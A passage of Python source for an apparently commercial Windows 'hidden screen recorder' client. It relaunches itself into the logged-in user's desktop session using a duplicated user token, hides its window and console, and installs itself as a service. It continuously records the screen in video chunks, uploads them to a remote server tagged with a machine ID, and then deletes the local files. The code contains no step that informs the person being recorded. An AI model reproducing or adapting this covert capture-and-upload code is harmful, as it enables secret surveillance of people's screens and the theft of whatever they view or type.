    def _get_active_user_session_id() -> int:
        """Get the session ID of the currently active interactive user session"""
        try:
            import ctypes

            # WTSGetActiveConsoleSessionId returns the session ID of the console (interactive) session
            session_id = ctypes.windll.kernel32.WTSGetActiveConsoleSessionId()
            return session_id
        except Exception:
            return -1

    def _is_session_zero(self) -> bool:
        """Check if this process is running in Windows Session 0 (service/system context)"""
        sid = self._get_current_session_id()
        logger.info(f"[SESSION] Current process session ID: {sid}")
        return sid == 0

    def _relaunch_in_user_session(self) -> bool:
        """
        Relaunch this process inside the active user's interactive desktop session.
        Uses WTSQueryUserToken + CreateProcessAsUser so that mss/screen-capture
        APIs can reach the real display instead of the Session-0 blank desktop.
        Returns True if the child process was successfully launched.
        """
        try:
            import ctypes
            import ctypes.wintypes

            wtsapi32 = ctypes.windll.wtsapi32
            advapi32 = ctypes.windll.advapi32
            userenv = ctypes.windll.userenv
            kernel32 = ctypes.windll.kernel32

            active_session = self._get_active_user_session_id()
            logger.info(f"[SESSION] Active user session ID: {active_session}")
            if active_session == 0 or active_session == 0xFFFFFFFF:
                logger.warning(
                    "[SESSION] No active interactive user session found. " "Cannot relaunch in user session."
                )
                return False

            # Obtain the token for the active session
            h_token = ctypes.wintypes.HANDLE()
            if not wtsapi32.WTSQueryUserToken(active_session, ctypes.byref(h_token)):
                err = kernel32.GetLastError()
                logger.error(
                    f"[SESSION] WTSQueryUserToken failed (error {err}). "
                    "Make sure the service has the 'Act as part of the operating system' privilege."
                )
                return False

            # Duplicate the token so we can use it with CreateProcessAsUser
            h_dup_token = ctypes.wintypes.HANDLE()
            TOKEN_ALL_ACCESS = 0xF01FF
            if not advapi32.DuplicateTokenEx(
                h_token,
                TOKEN_ALL_ACCESS,
                None,
                2,  # SecurityImpersonation
                1,  # TokenPrimary
                ctypes.byref(h_dup_token),
            ):
                err = kernel32.GetLastError()
                logger.error(f"[SESSION] DuplicateTokenEx failed (error {err})")
                kernel32.CloseHandle(h_token)
                return False

            # Load user environment
            env_block = ctypes.c_void_p()
            if not userenv.CreateEnvironmentBlock(ctypes.byref(env_block), h_dup_token, False):
                logger.warning("[SESSION] CreateEnvironmentBlock failed, using inherited env")
                env_block = None

            # Build command line: same interpreter + this script
            python_exe = sys.executable
            script_path = os.path.abspath(__file__)
            cmd = f'"{python_exe}" "{script_path}"'
            logger.info(f"[SESSION] Relaunching in user session with command: {cmd}")

            class STARTUPINFO(ctypes.Structure):
                _fields_ = [
                    ("cb", ctypes.wintypes.DWORD),
                    ("lpReserved", ctypes.wintypes.LPWSTR),
                    ("lpDesktop", ctypes.wintypes.LPWSTR),
                    ("lpTitle", ctypes.wintypes.LPWSTR),
                    ("dwX", ctypes.wintypes.DWORD),
                    ("dwY", ctypes.wintypes.DWORD),
                    ("dwXSize", ctypes.wintypes.DWORD),
                    ("dwYSize", ctypes.wintypes.DWORD),
                    ("dwXCountChars", ctypes.wintypes.DWORD),
                    ("dwYCountChars", ctypes.wintypes.DWORD),
                    ("dwFillAttribute", ctypes.wintypes.DWORD),
                    ("dwFlags", ctypes.wintypes.DWORD),
                    ("wShowWindow", ctypes.wintypes.WORD),
                    ("cbReserved2", ctypes.wintypes.WORD),
                    ("lpReserved2", ctypes.c_void_p),
                    ("hStdInput", ctypes.wintypes.HANDLE),
                    ("hStdOutput", ctypes.wintypes.HANDLE),
                    ("hStdError", ctypes.wintypes.HANDLE),
                ]

            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("hProcess", ctypes.wintypes.HANDLE),
                    ("hThread", ctypes.wintypes.HANDLE),
                    ("dwProcessId", ctypes.wintypes.DWORD),
                    ("dwThreadId", ctypes.wintypes.DWORD),
                ]

            si = STARTUPINFO()
            si.cb = ctypes.sizeof(si)
            si.lpDesktop = "winsta0\\default"  # Interactive desktop
            si.dwFlags = 0x00000001  # STARTF_USESHOWWINDOW
            si.wShowWindow = 0  # SW_HIDE

            pi = PROCESS_INFORMATION()

            CREATION_FLAGS = 0x00000010 | 0x00000400  # CREATE_NEW_CONSOLE  # CREATE_UNICODE_ENVIRONMENT

            result = advapi32.CreateProcessAsUserW(
                h_dup_token,
                None,
                cmd,
                None,
                None,
                False,
                CREATION_FLAGS,
                env_block,
                str(Path(__file__).parent),
                ctypes.byref(si),
                ctypes.byref(pi),
            )

            if env_block:
                userenv.DestroyEnvironmentBlock(env_block)
            kernel32.CloseHandle(h_token)
            kernel32.CloseHandle(h_dup_token)

            if result:
                logger.info(f"[SESSION] Successfully launched recorder in user session " f"(PID: {pi.dwProcessId})")
                kernel32.CloseHandle(pi.hProcess)
                kernel32.CloseHandle(pi.hThread)
                return True
            else:
                err = kernel32.GetLastError()
                logger.error(f"[SESSION] CreateProcessAsUserW failed (error {err})")
                return False

        except Exception as exc:
            logger.error(f"[SESSION] Failed to relaunch in user session: {exc}", exc_info=True)
            return False

    def _record_loop(self) -> None:
        """Main recording loop with pause/resume and configurable region support"""
        # MSS is not thread-safe, create instance in this thread
        sct = mss.mss()

        # Log all available monitors for debugging
        logger.info(f"[RECORD] Number of monitors detected: {len(sct.monitors)}")
        for i, monitor in enumerate(sct.monitors):
            logger.info(f"[RECORD] Monitor {i}: {monitor}")

        fps = self.config.recording_fps
        chunk_duration = self.config.chunk_duration

        # Get capture region based on monitor selection and region settings
        monitor_idx = self.config.monitor_selection
        if monitor_idx < 1 or monitor_idx >= len(sct.monitors):
            logger.warning(f"[RECORD] Invalid monitor {monitor_idx}, using primary")
            monitor_idx = 1

        capture_region = self._get_monitor_region(sct, monitor_idx)
        width = capture_region["width"]
        height = capture_region["height"]

        logger.info(f"[RECORD] Capture region: {width}x{height} at ({capture_region['left']}, {capture_region['top']})")

        fourcc = cv2.VideoWriter_fourcc(*"mp4v")

        chunk_start_time = time.time()
        video_path = self._get_video_path()
        self.video_writer = cv2.VideoWriter(str(video_path), fourcc, fps, (width, height))

        # Check if video writer opened successfully
        if not self.video_writer.isOpened():
            logger.error(f"[RECORD] Failed to open video writer for {video_path}")
            self.state = ClientState.ERROR
            return

        logger.info(f"[RECORD] Started new video chunk: {video_path.name} (resolution: {width}x{height}, fps: {fps})")

        frames_captured = 0
        consecutive_black_frames = 0
        max_black_frames_before_warning = 30  # Warn after ~3 seconds at 10fps
        monitor_to_use = monitor_idx
        paused_time = 0.0  # Track time spent paused

        while not self._stop_event.is_set():
            # Handle pause/resume
            if self._pause_event.is_set():
                if self.state == ClientState.RECORDING:
                    # Just entered pause state
                    pause_start = time.time()
                    self.state = ClientState.PAUSED
                    logger.info("[RECORD] Recording paused, waiting...")

                # Wait while paused (check every 100ms)
                time.sleep(0.1)
                paused_time += 0.1
                continue
            elif self.state == ClientState.PAUSED:
                # Just resumed
                self.state = ClientState.RECORDING
                logger.info(f"[RECORD] Recording resumed after {paused_time:.1f}s pause")

            try:
                # Capture screen from selected monitor with region
                screenshot = sct.grab(capture_region)
                frame = np.array(screenshot)

                # Validate we got a valid frame
                if frame.size == 0:
                    logger.warning("[RECORD] Captured empty frame")
                    time.sleep(1.0 / fps)
                    continue

                # Log frame properties occasionally for debugging
                if frames_captured == 0:
                    logger.info(f"[RECORD] Frame properties: shape={frame.shape}, dtype={frame.dtype}")
                    # Sample a few pixel values to see if we're getting valid data
                    if frame.shape[0] > 10 and frame.shape[1] > 10:
                        sample = frame[5:10, 5:10]
                        logger.info(f"[RECORD] Sample pixel values (BGRA): {sample.flatten()[:12]}")

                # Check if frame appears to be black (all zeros or very low values)
                if frames_captured < 100:  # Only check first 100 frames to avoid spam
                    mean_val = np.mean(frame)
                    if mean_val < 5:  # Very dark frame
                        consecutive_black_frames += 1
                        if consecutive_black_frames == max_black_frames_before_warning:
                            logger.warning(
                                f"[RECORD] Detected {consecutive_black_frames} consecutive dark frames "
                                f"(mean pixel value: {mean_val:.2f}). This may indicate a screen capture issue. "
                                f"Please ensure the screen is not sleeping or a screensaver is not active."
                            )
                            # Log available monitors for debugging (no dynamic switching to avoid dimension mismatch)
                            for test_monitor_idx in range(1, min(len(sct.monitors), 5)):
                                try:
                                    test_shot = sct.grab(sct.monitors[test_monitor_idx])
                                    test_frame = np.array(test_shot)
                                    if test_frame.size > 0:
                                        test_mean = np.mean(test_frame)
                                        logger.info(
                                            f"[RECORD] Monitor {test_monitor_idx} mean pixel value: {test_mean:.2f}"
                                        )
                                except Exception as monitor_err:
                                    logger.debug(f"[RECORD] Error testing monitor {test_monitor_idx}: {monitor_err}")
                    else:
                        consecutive_black_frames = 0  # Reset counter if we get a bright frame

                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

                # Write frame
                if self.video_writer is not None:
                    self.video_writer.write(frame)
                    frames_captured += 1

                # Check if chunk duration exceeded
                if time.time() - chunk_start_time >= chunk_duration:
                    # Save current chunk and start new one
                    if self.video_writer is not None:
                        self.video_writer.release()
                        logger.info(f"[RECORD] Released video writer for chunk: {video_path.name}")

                    # Thread-safe append to video_chunks
                    with self._video_chunks_lock:
                        self.video_chunks.append(video_path)
                    logger.info(f"[RECORD] Video chunk completed: {video_path.name} (frames: {frames_captured})")

                    # Start new chunk
                    chunk_start_time = time.time()
                    video_path = self._get_video_path()
                    self.video_writer = cv2.VideoWriter(str(video_path), fourcc, fps, (width, height))
                    # Check if new video writer opened successfully
                    if not self.video_writer.isOpened():
                        logger.error(f"[RECORD] Failed to open video writer for {video_path}")
                        return
                    logger.info(f"[RECORD] Started new video chunk: {video_path.name}")
                    frames_captured = 0
                    consecutive_black_frames = 0  # Reset black frame counter for new chunk

                time.sleep(1.0 / fps)
            except Exception as e:
                logger.error(f"[RECORD] Recording error: {e}", exc_info=True)
                time.sleep(1)

    def _upload_loop(self) -> None:
        """Upload completed video chunks to server"""
        logger.info("[UPLOAD] Upload loop started")
        while not self._stop_event.is_set():
            try:
                # First, process offline queue
                queue_count = self.offline_queue.count()
                if queue_count > 0:
                    logger.info(f"[UPLOAD] Processing {queue_count} items in offline queue")

                while not self.offline_queue.is_empty():
                    task = self.offline_queue.get_next()
                    if task is None:
                        break

                    logger.info(f"[UPLOAD] Attempting upload of queued video: {task.video_path.name}")
                    success = self._upload_video_with_retry(task)
                    if success:
                        self.offline_queue.remove(task)
                        if task.video_path.exists():
                            file_size = task.video_path.stat().st_size
                            task.video_path.unlink()
                            logger.info(
                                f"[UPLOAD] Successfully uploaded and deleted queued video: {task.video_path.name} ({file_size} bytes)"
                            )
                        else:
                            logger.warning(f"[UPLOAD] Queued video already deleted: {task.video_path.name}")
                    else:
                        # Server still unreachable, wait and retry later
                        logger.warning(
                            f"[UPLOAD] Failed to upload queued video (will retry later): {task.video_path.name}"
                        )
                        break

                # Upload current chunks (thread-safe access)
                with self._video_chunks_lock:
                    chunks_to_process = list(self.video_chunks)

                chunks_count = len(chunks_to_process)
                if chunks_count > 0:
                    logger.info(f"[UPLOAD] Found {chunks_count} completed chunks ready for upload")

                    for video_path in chunks_to_process:
                        if video_path.exists():
                            file_size = video_path.stat().st_size
                            logger.info(
                                f"[UPLOAD] Attempting upload of completed chunk: {video_path.name} ({file_size} bytes)"
                            )
                            task = UploadTask(
                                video_path=video_path,
                                timestamp=datetime.now(timezone.utc),
                            )
                            success = self._upload_video_with_retry(task)
                            if success:
                                with self._video_chunks_lock:
                                    if video_path in self.video_chunks:
                                        self.video_chunks.remove(video_path)
                                try:
                                    video_path.unlink()
                                    logger.info(f"[UPLOAD] Successfully uploaded and deleted chunk: {video_path.name}")
                                except OSError as e:
                                    logger.error(f"[UPLOAD] Failed to delete uploaded chunk {video_path.name}: {e}")
                            else:
                                # Add to offline queue for later
                                logger.warning(f"[UPLOAD] Upload failed, moving to offline queue: {video_path.name}")
                                self.offline_queue.add(video_path)
                                with self._video_chunks_lock:
                                    if video_path in self.video_chunks:
                                        self.video_chunks.remove(video_path)
                        else:
                            logger.warning(f"[UPLOAD] Chunk file missing, removing from tracking: {video_path.name}")
                            with self._video_chunks_lock:
                                if video_path in self.video_chunks:
                                    self.video_chunks.remove(video_path)

                # Wait for next interval
                logger.debug(f"[UPLOAD] Upload loop sleeping for {self.config.upload_interval} seconds")
                self._stop_event.wait(self.config.upload_interval)

            except Exception as e:
                logger.error(f"[UPLOAD] Upload error: {e}", exc_info=True)
                time.sleep(60)

    def _upload_video_with_retry(self, task: UploadTask) -> bool:
        """Upload a video file with retry logic"""
        if not task.video_path.exists():
            logger.warning(f"[UPLOAD] Video file not found: {task.video_path.name}")
            return True  # Remove from queue

        file_size = task.video_path.stat().st_size
        logger.info(f"[UPLOAD] Starting upload attempt for: {task.video_path.name} ({file_size} bytes)")
        url = f"{self.config.server_url}/api/v1/upload"

        for attempt in range(task.retry_count, self.retry_handler.max_retries):
            try:
                with open(task.video_path, "rb") as f:
                    # Wrap with throttled reader if speed limit is configured
                    upload_file = (
                        ThrottledFileReader(f, self.config.upload_speed_limit_kbps)
                        if self.config.upload_speed_limit_kbps > 0
                        else f
                    )
                    files = {"video": (task.video_path.name, upload_file, "video/mp4")}
                    headers = {
                        "X-License-Key": self.license_key or "",
                        "X-Machine-ID": self.machine_id,
                    }
                    data = {
                        "machine_id": self.machine_id,
                        "timestamp": task.timestamp.isoformat(),
                    }

                    logger.debug(
                        f"[UPLOAD] Attempt {attempt + 1}/{self.retry_handler.max_retries} for {task.video_path.name}"
                    )
                    response = requests.post(url, files=files, data=data, headers=headers, timeout=60)

                    if response.status_code == 200:
                        logger.info(f"[UPLOAD] SUCCESS: Video uploaded successfully: {task.video_path.name}")
                        return True
                    elif 500 <= response.status_code < 600:
                        # Server error, retry
                        logger.warning(
                            f"[UPLOAD] Server error {response.status_code} for {task.video_path.name}, will retry"
                        )
                        raise requests.exceptions.HTTPError(response=response)
                    else:
                        # Client error, don't retry
                        logger.error(
                            f"[UPLOAD] Upload failed (client error) for {task.video_path.name}: HTTP {response.status_code} - {response.text[:200]}"
                        )
                        return False

            except requests.exceptions.RequestException as e:
                task.retry_count = attempt + 1
                task.last_error = str(e)
                logger.warning(f"[UPLOAD] Network error on attempt {attempt + 1} for {task.video_path.name}: {e}")

                if self.retry_handler.should_retry(attempt + 1, e):
                    delay = self.retry_handler.get_delay(attempt + 1)
                    logger.warning(f"[UPLOAD] Upload failed, retrying in {delay:.1f}s: {e}")
                    time.sleep(delay)
                else:
                    logger.error(f"[UPLOAD] Upload failed after {attempt + 1} attempts for {task.video_path.name}: {e}")
                    return False

        logger.error(f"[UPLOAD] Giving up on {task.video_path.name} after {self.retry_handler.max_retries} attempts")
        return False


class HiddenRunner:
    """Manages hidden execution of the screen recorder"""

    def __init__(self):
        self.recorder: Optional[ScreenRecorder] = None
        self.running = False

    def start(self) -> bool:
        """Start the hidden screen recorder"""
        logger.info("[HIDDEN_RUNNER] Starting hidden screen recorder service")
        try:
            # Hide console window on Windows
            self._hide_console()

            logger.info("[HIDDEN_RUNNER] Creating ScreenRecorder instance")
            self.recorder = ScreenRecorder()
            self.recorder._owner_runner = self  # Allow signal handler to stop runner loop

            # Validate license
            logger.info("[HIDDEN_RUNNER] Validating license...")
            valid, result = self.recorder.validate_license()
            if not valid:
                logger.error(f"[HIDDEN_RUNNER] License validation failed: {result}")
                return False
            logger.info("[HIDDEN_RUNNER] License validation successful")

            # Start recording
            logger.info("[HIDDEN_RUNNER] Starting recording...")
            if self.recorder.start_recording():
                self.running = True
                logger.info("[HIDDEN_RUNNER] Screen recorder service started successfully")
                return True
            else:
                logger.error("[HIDDEN_RUNNER] Failed to start recording")
                return False

        except Exception as e:
            logger.error(f"[HIDDEN_RUNNER] Failed to start hidden runner: {e}", exc_info=True)
            return False

    def stop(self) -> None:
        """Stop the screen recorder gracefully."""
        logger.info("[RUNNER] Stopping screen recorder service...")
        self.running = False  # Set this first so main loop exits
        if self.recorder:
            self.recorder.stop_recording(timeout=10.0)  # Give threads more time to complete
        logger.info("[RUNNER] Screen recorder service stopped")

    def _hide_console(self) -> None:
        """Hide the console window on Windows"""
        try:
            import ctypes

            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except (ImportError, AttributeError, OSError):
            pass

    def run_forever(self) -> None:
        """Run the service until stopped with signal handling."""
        if self.start():
            try:
                # Main loop - check for stop signal periodically
                while self.running:
                    # Sleep in small increments to allow signal handlers to interrupt
                    # This ensures we can respond to signals promptly
                    for _ in range(10):  # 1 second total, in 0.1s increments
                        time.sleep(0.1)
                        if not self.running:
                            break
            except KeyboardInterrupt:
                logger.info("[RUNNER] Keyboard interrupt received, stopping...")
            except SystemExit:
                logger.info("[RUNNER] System exit received, stopping...")
            except Exception as e:
                logger.error(f"[RUNNER] Unexpected error in main loop: {e}", exc_info=True)
            finally:
                self.stop()


def install_as_service() -> None:
    """Install the recorder as a Windows service"""
    try:
        import win32service
        import win32serviceutil
        import win32event
        import servicemanager

        class ScreenRecorderService(win32serviceutil.ServiceFramework):
            _svc_name_ = "ScreenRecSvc"
            _svc_display_name_ = "Screen Recording Service"
            _svc_description_ = "Automatic screen recording service"

            def __init__(self, args):
                win32serviceutil.ServiceFramework.__init__(self, args)
                self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
                self.runner = None

            def SvcStop(self):
                self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
                if self.runner:
                    self.runner.stop()
                win32event.SetEvent(self.hWaitStop)

            def SvcDoRun(self):
                self.runner = HiddenRunner()
                self.runner.start()
                win32event.WaitForSingleObject(self.hWaitStop, win32event.INFINITE)

        win32serviceutil.HandleCommandLine(ScreenRecorderService)

    except ImportError:
        logger.warning("pywin32 not available, running as regular process")
        runner = HiddenRunner()
        runner.run_forever()


if __name__ == "__main__":
    # Check for CLI flags
    if len(sys.argv) > 1:
        if sys.argv[1] in ("install", "--install"):
            # Normalize to pywin32's expected 'install' argument
            sys.argv[1] = "install"
            install_as_service()
        elif sys.argv[1] in ("remove", "--uninstall"):
            sys.argv[1] = "remove"
            install_as_service()
        elif sys.argv[1] in ("--get-id", "-g"):
            # Print machine ID and exit
            print(f"Your Machine ID: {MachineIdentifier.get_machine_id()}")
            sys.exit(0)
        elif sys.argv[1] in ("--help", "-h"):
            print("Screen Recorder Client")
            print("")
            print("Usage:")
            print("  python screen_recorder.py          Start recording (hidden)")
            print("  python screen_recorder.py --get-id Print machine ID")
            print("  python screen_recorder.py --install Install as Windows service")
            print("  python screen_recorder.py --uninstall Remove Windows service")
            print("  python screen_recorder.py --help   Show this help message")
            sys.exit(0)
        else:
            print(f"Unknown argument: {sys.argv[1]}")
            print("Use --help for usage information")
            sys.exit(1)
    else:
        # Run as hidden process
        runner = HiddenRunner()
        runner.run_forever()
